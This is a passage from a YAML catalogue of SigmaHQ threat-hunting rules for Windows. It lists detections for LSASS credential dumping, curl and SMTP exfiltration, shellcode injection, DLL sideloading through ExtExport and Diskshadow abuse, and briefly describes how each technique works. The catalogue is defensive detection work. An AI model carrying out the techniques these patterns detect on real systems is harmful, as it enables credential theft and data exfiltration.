  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-24---set-a-firewall-rule-using-new-netfirewallrule
  - https://malware.news/t/the-rhysida-ransomware-activity-analysis-and-ties-to-vice-society/72170
  - https://cybersecuritynews.com/rhysida-ransomware-attacking-windows/
  false_positives:
  - Administrator script
  notes: ''
- detection_id: 6df07c3b-8456-4f8b-87bb-fe31ec964cae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_script/posh_ps_new_smbmapping_quic.yml
  name: SMB over QUIC Via PowerShell Script
  description: Detects the mounting of Windows SMB shares over QUIC, which can be
    an unexpected event in some enterprise environments
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1570
  tags:
  - attack.lateral-movement
  - attack.t1570
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/74438b0237d141ee9c99747976447dc884cb1a39/atomics/T1570/T1570.md
  - https://learn.microsoft.com/en-us/powershell/module/smbshare/new-smbmapping?view=windowsserver2022-ps
  - https://www.trustedsec.com/blog/making-smb-accessible-with-ntlmquic/
  false_positives:
  - Due to the nature of the script block, the matching of the string could sometimes
    result in a false positive. Use this rule to hunt for potential malicious or suspicious
    scripts.
  notes: ''
- detection_id: 064060aa-09fb-4636-817f-020a32aa7e9e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_script/posh_ps_registry_reconnaissance.yml
  name: Potential Registry Reconnaissance Via PowerShell Script
  description: Detects PowerShell scripts with potential registry reconnaissance capabilities.
    Adversaries may interact with the Windows registry to gather information about
    the system credentials, configuration, and installed software.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1007
  - T1012
  tags:
  - attack.discovery
  - attack.t1012
  - attack.t1007
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1012/T1012.md
  false_positives:
  - Due to the nature of the script block, the matching of the string could sometimes
    result in a false positive. Use this rule to hunt for potential malicious or suspicious
    scripts.
  notes: ''
- detection_id: b8af5f36-1361-4ebe-9e76-e36128d947bf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_script/posh_ps_remove_item_path.yml
  name: Use Of Remove-Item to Delete File - ScriptBlock
  description: PowerShell Remove-Item  with -Path to delete a file or a folder with
    "-Recurse"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md
  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/Remove-Item?view=powershell-5.1&viewFallbackFrom=powershell-7
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: 9a7afa56-4762-43eb-807d-c3dc9ffe211b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_script/posh_ps_send_mailmessage.yml
  name: Potential Data Exfiltration Over SMTP Via Send-MailMessage Cmdlet
  description: 'Detects the execution of a PowerShell script with a call to the "Send-MailMessage"
    cmdlet along with the "-Attachments" flag. This could be a potential sign of data
    exfiltration via Email.

    Adversaries may steal data by exfiltrating it over an un-encrypted network protocol
    other than that of the existing command and control channel. The data may also
    be sent to an alternate network location from the main command and control server.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048.003
  tags:
  - attack.exfiltration
  - attack.t1048.003
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1048.003/T1048.003.md#atomic-test-5---exfiltration-over-alternative-protocol---smtp
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/send-mailmessage?view=powershell-7.4
  - https://www.ietf.org/rfc/rfc2821.txt
  false_positives:
  - Unknown
  notes: ''
- detection_id: f3a98ce4-6164-4dd4-867c-4d83de7eca51
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_script/posh_ps_token_obfuscation.yml
  name: Powershell Token Obfuscation - Powershell
  description: 'Detects TOKEN OBFUSCATION technique from Invoke-Obfuscation in Powershell
    scripts.

    Use this rule as a threat-hunting baseline to find obfuscated scripts in your
    environment.

    Once tested and tuned, consider deploying a production detection rule based on
    this hunting rule.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1027.009
  tags:
  - attack.defense-evasion
  - attack.t1027.009
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/danielbohannon/Invoke-Obfuscation
  false_positives:
  - Edge case might be possible with heavy use of string formatting or obfuscation
    in legitimate scripts.
  notes: ''
- detection_id: 19d65a1c-8540-4140-8062-8eb00db0bba5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_script/posh_ps_win_api_functions_access.yml
  name: WinAPI Library Calls Via PowerShell Scripts
  description: Detects calls to WinAPI libraries from PowerShell scripts. Attackers
    can often leverage these APIs to avoid detection based on typical PowerShell function
    calls. Use this rule as a basis to hunt for interesting scripts.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1106
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.t1106
  - detection.threat-hunting
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
  false_positives:
  - Carbon PowerShell Module (https://github.com/webmd-health-services/Carbon)
  - Chocolatey scripts
  notes: ''
- detection_id: 9f22ccd5-a435-453b-af96-bf99cbb594d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_script/posh_ps_win_api_library_access.yml
  name: WinAPI Function Calls Via PowerShell Scripts
  description: Detects calls to WinAPI functions from PowerShell scripts. Attackers
    can often leverage these APIs to avoid detection based on typical PowerShell function
    calls. Use this rule as a basis to hunt for interesting scripts.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1106
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.t1106
  - detection.threat-hunting
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
  false_positives:
  - This rule is mainly used for hunting and will generate quite a lot of false positives
    when applied in production. It's best combined with other fields such as the path
    of execution, the parent process, etc.
  notes: ''
- detection_id: 0f920ebe-7aea-4c54-b202-9aa0c609cfe5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_access/proc_access_win_lsass_powershell_access.yml
  name: Potential Credential Dumping Attempt Via PowerShell
  description: Detects a PowerShell process requesting access to "lsass.exe", which
    can be indicative of potential credential dumping attempts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
  false_positives:
  - Unknown
  notes: ''
- detection_id: fa34b441-961a-42fa-a100-ecc28c886725
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_access/proc_access_win_lsass_susp_source_process.yml
  name: LSASS Access From Program In Potentially Suspicious Folder
  description: Detects process access to LSASS memory with suspicious access flags
    and from a potentially suspicious folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.s0002
  - detection.threat-hunting
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
  - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow
  - https://web.archive.org/web/20230208123920/https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  - https://web.archive.org/web/20230420013146/http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf
  false_positives:
  - Updaters and installers are typical false positives. Apply custom filters depending
    on your environment
  notes: ''
- detection_id: 678dfc63-fefb-47a5-a04c-26bcf8cc9f65
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_access/proc_access_win_lsass_uncommon_access_flag.yml
  name: Uncommon GrantedAccess Flags On LSASS
  description: Detects process access to LSASS memory with uncommon access flags 0x410
    and 0x01410
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 10
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.s0002
  - detection.threat-hunting
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
  - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow
  - https://web.archive.org/web/20230208123920/https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  - https://web.archive.org/web/20230420013146/http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf
  false_positives:
  - Legitimate software accessing LSASS process for legitimate reason
  notes: ''
- detection_id: 250ae82f-736e-4844-a68b-0b5e8cc887da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_access/proc_access_win_susp_potential_shellcode_injection.yml
  name: Potential Shellcode Injection
  description: Detects potential shellcode injection as seen used by tools such as
    Metasploit's migrate and Empire's psinject.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/EmpireProject/PSInject
  false_positives:
  - Unknown
  notes: ''
- detection_id: b717b8fd-6467-4d7d-b3d3-27f9a463af77
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_7zip_password_extraction.yml
  name: Password Protected Compressed File Extraction Via 7Zip
  description: Detects usage of 7zip utilities (7z.exe, 7za.exe and 7zr.exe) to extract
    password protected zip files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560.001
  tags:
  - attack.collection
  - attack.t1560.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://blog.cyble.com/2022/06/07/bumblebee-loader-on-the-rise/
  false_positives:
  - Legitimate activity is expected since extracting files with a password can be
    common in some environment.
  notes: ''
- detection_id: bb19e94c-59ae-4c15-8c12-c563d23fe52b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_attrib_system.yml
  name: Set Files as System Files Using Attrib.EXE
  description: Detects the execution of "attrib" with the "+s" flag to mark files
    as system files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.001
  tags:
  - attack.defense-evasion
  - attack.t1564.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.001/T1564.001.md#atomic-test-3---create-windows-system-file-with-attrib
  - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/attrib
  - https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0090b851-3543-42db-828c-02fee986ff0b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_boinc_execution.yml
  name: Potential BOINC Software Execution (UC-Berkeley Signature)
  description: 'Detects the use of software that is related to the University of California,
    Berkeley via metadata information.

    This indicates it may be related to BOINC software and can be used maliciously
    if unauthorized.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1553
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1553
  - detection.threat-hunting
  time_window: ''
  references:
  - https://boinc.berkeley.edu/
  - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software
  false_positives:
  - This software can be used for legitimate purposes when installed intentionally.
  notes: ''
- detection_id: 4f4eaa9f-5ad4-410c-a4be-bc6132b0175a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_cmd_redirect.yml
  name: CMD Shell Output Redirect
  description: 'Detects the use of the redirection character ">" to redirect information
    on the command line.

    This technique is sometimes used by malicious actors in order to redirect the
    output of reconnaissance commands such as "hostname" and "dir" to files for future
    exfiltration.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  - detection.threat-hunting
  time_window: ''
  references:
  - https://ss64.com/nt/syntax-redirection.html
  false_positives:
  - Internet Download Manager extensions use named pipes and redirection via CLI.
    Filter it out if you use it in your environment
  notes: ''
- detection_id: 65e4c134-ee52-4099-9e35-5e17a4b45c62
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_cmd_set_prompt_abuse.yml
  name: Potential File Override/Append Via SET Command
  description: 'Detects the use of the "SET" internal command of Cmd.EXE with the
    /p flag followed directly by an "=" sign.

    Attackers used this technique along with an append redirection operator ">>" in
    order to update the content of a file indirectly.

    Ex: cmd /c >> example.txt set /p="test data". This will append "test data" to
    contents of "example.txt".

    The typical use case of the "set /p=" command is to prompt the user for input.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.defense-evasion
  - detection.threat-hunting
  time_window: ''
  references:
  - https://news.sophos.com/en-us/2024/08/07/sophos-mdr-hunt-tracks-mimic-ransomware-campaign-against-organizations-in-india/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/set_1
  - https://ss64.com/nt/set.html
  false_positives:
  - Legitimate use of the SET with the "/p" flag for user prompting. command in administrative
    scripts or user-generated scripts.
  notes: ''
- detection_id: 00ca75ab-d5ce-43be-b86c-55ff39c6abfc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_conhost_headless_execution.yml
  name: Headless Process Launched Via Conhost.EXE
  description: 'Detects the launch of a child process via "conhost.exe" with the "--headless"
    flag.

    The "--headless" flag hides the windows from the user upon execution.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1059.003
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059.001
  - attack.t1059.003
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software
  false_positives:
  - Unknown
  notes: ''
- detection_id: acf2807c-805b-4042-aab9-f86b6ba9cb2b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_csc_compilation.yml
  name: Dynamic .NET Compilation Via Csc.EXE - Hunting
  description: Detects execution of "csc.exe" to compile .NET code. Attackers often
    leverage this to compile code on the fly and use it in other stages.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027.004
  tags:
  - attack.defense-evasion
  - attack.t1027.004
  - detection.threat-hunting
  time_window: ''
  references:
  - https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/
  - https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf
  - https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/
  - https://twitter.com/gN3mes1s/status/1206874118282448897
  false_positives:
  - Many legitimate applications make use of dynamic compilation. Use this rule to
    hunt for anomalies
  notes: ''
- detection_id: 9a517fca-4ba3-4629-9278-a68694697b81
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_curl_download.yml
  name: File Download Via Curl.EXE
  description: Detects file download using curl.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  - detection.threat-hunting
  time_window: ''
  references:
  - https://web.archive.org/web/20200128160046/https://twitter.com/reegun21/status/1222093798009790464
  false_positives:
  - Scripts created by developers and admins
  - Administrative activity
  - The "\Git\usr\bin\sh.exe" process uses the "--output" flag to download a specific
    file in the temp directory with the pattern "gfw-httpget-xxxxxxxx.txt "
  notes: ''
- detection_id: bbeaed61-1990-4773-bf57-b81dbad7db2d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_curl_execution.yml
  name: Curl.EXE Execution
  description: Detects a curl process start on Windows, which could indicates a file
    download from a remote location or a simple web request to a remote server
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  - detection.threat-hunting
  time_window: ''
  references:
  - https://web.archive.org/web/20200128160046/https://twitter.com/reegun21/status/1222093798009790464
  false_positives:
  - Scripts created by developers and admins
  - Administrative activity
  notes: ''
- detection_id: 00bca14a-df4e-4649-9054-3f2aa676bc04
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_curl_fileupload.yml
  name: Potential Data Exfiltration Via Curl.EXE
  description: Detects the execution of the "curl" process with "upload" flags. Which
    might indicate potential data exfiltration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1105
  - T1567
  tags:
  - attack.exfiltration
  - attack.command-and-control
  - attack.t1567
  - attack.t1105
  - detection.threat-hunting
  time_window: ''
  references:
  - https://twitter.com/d1r4c/status/1279042657508081664
  - https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-19---curl-upload-file
  - https://curl.se/docs/manpage.html
  false_positives:
  - Scripts created by developers and admins
  notes: ''
- detection_id: 3286d37a-00fd-41c2-a624-a672dcd34e60
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_curl_useragent.yml
  name: Curl.EXE Execution With Custom UserAgent
  description: Detects execution of curl.exe with custom useragent options
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://curl.se/docs/manpage.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1071.001/T1071.001.md#atomic-test-2---malicious-user-agents---cmd
  false_positives:
  - Scripts created by developers and admins
  - Administrative activity
  notes: ''
- detection_id: 241d52b5-eee0-49d0-ac8a-8b9c15c7221c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_dfsvc_child_processes.yml
  name: ClickOnce Deployment Execution - Dfsvc.EXE Child Process
  description: Detects child processes of "dfsvc" which indicates a ClickOnce deployment
    execution.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.defense-evasion
  - detection.threat-hunting
  time_window: ''
  references:
  - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
  false_positives:
  - False positives are expected in environement leveraging ClickOnce deployments.
    An initial baselining is required before using this rule in production.
  notes: ''
- detection_id: 56b1dde8-b274-435f-a73a-fb75eb81262a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_diskshadow_child_process.yml
  name: Diskshadow Child Process Spawned
  description: Detects any child process spawning from "Diskshadow.exe". This could
    be due to executing Diskshadow in interpreter mode or script mode and using the
    "exec" flag to launch other applications.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.execution
  - detection.threat-hunting
  time_window: ''
  references:
  - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/
  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
  - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
  false_positives:
  - Likely from legitimate usage of Diskshadow in Interpreter mode.
  notes: ''
- detection_id: 0c2f8629-7129-4a8a-9897-7e0768f13ff2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_diskshadow_script_mode.yml
  name: Diskshadow Script Mode Execution
  description: 'Detects execution of "Diskshadow.exe" in script mode using the "/s"
    flag. Attackers often abuse "diskshadow" to execute scripts that deleted the shadow
    copies on the systems. Investigate the content of the scripts and its location.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.execution
  - detection.threat-hunting
  time_window: ''
  references:
  - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/
  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
  - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
  false_positives:
  - Likely from legitimate backup scripts
  notes: ''
- detection_id: 9eb271b9-24ae-4cd4-9465-19cfc1047f3e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_explorer_child_of_shell_process.yml
  name: Potential Proxy Execution Via Explorer.EXE From Shell Process
  description: 'Detects the creation of a child "explorer.exe" process from a shell
    like process such as "cmd.exe" or "powershell.exe".

    Attackers can use "explorer.exe" for evading defense mechanisms by proxying the
    execution through the latter.

    While this is often a legitimate action, this rule can be use to hunt for anomalies.

    Muddy Waters threat actor was seeing using this technique.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - detection.threat-hunting
  time_window: ''
  references:
  - https://twitter.com/CyberRaiju/status/1273597319322058752
  - https://app.any.run/tasks/9a8fd563-4c54-4d0a-9ad8-1fe08339cbc3/
  false_positives:
  - Legitimate explorer.exe run from a shell host like "cmd.exe" or "powershell.exe"
  notes: ''
- detection_id: fb0b815b-f5f6-4f50-970f-ffe21f253f7a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_extexport_execution.yml
  name: Potential DLL Sideloading Activity Via ExtExport.EXE
  description: 'Detects the execution of "Extexport.exe".A utility that is part of
    the Internet Explorer browser and is used to export and import various settings
    and data, particularly when switching between Internet Explorer and other web
    browsers like Firefox. It allows users to transfer bookmarks, browsing history,
    and other preferences from Internet Explorer to Firefox or vice versa.

    It can be abused as a tool to side load any DLL. If a folder is provided in the
    command line it''ll load any DLL with one of the following names "mozcrt19.dll",
    "mozsqlite3.dll", or "sqlite.dll".

    Arbitrary DLLs can also be loaded if a specific number of flags was provided.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - detection.threat-hunting
  time_window: ''
  references:
